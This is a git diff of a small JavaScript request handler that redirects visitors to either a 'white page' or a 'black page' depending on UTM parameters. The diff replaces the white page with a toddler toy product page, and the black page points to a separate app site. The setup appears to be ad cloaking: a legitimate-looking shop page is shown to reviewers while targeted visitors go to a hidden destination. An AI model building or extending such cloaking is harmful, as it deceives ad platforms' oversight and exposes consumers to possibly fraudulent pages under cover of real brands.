@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.sterntaler.com/en/products/spulmaschinenfeste-sticker-hanni";
+    const whitePageURL = "https://donebydeer.com/en-dk/collections/activity-toys-for-babies-and-toddlers/products/tiny-farm-play-set-clucky-colour-mix";
     const blackPageURL = "https://nowherehe.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,4 +25,5 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
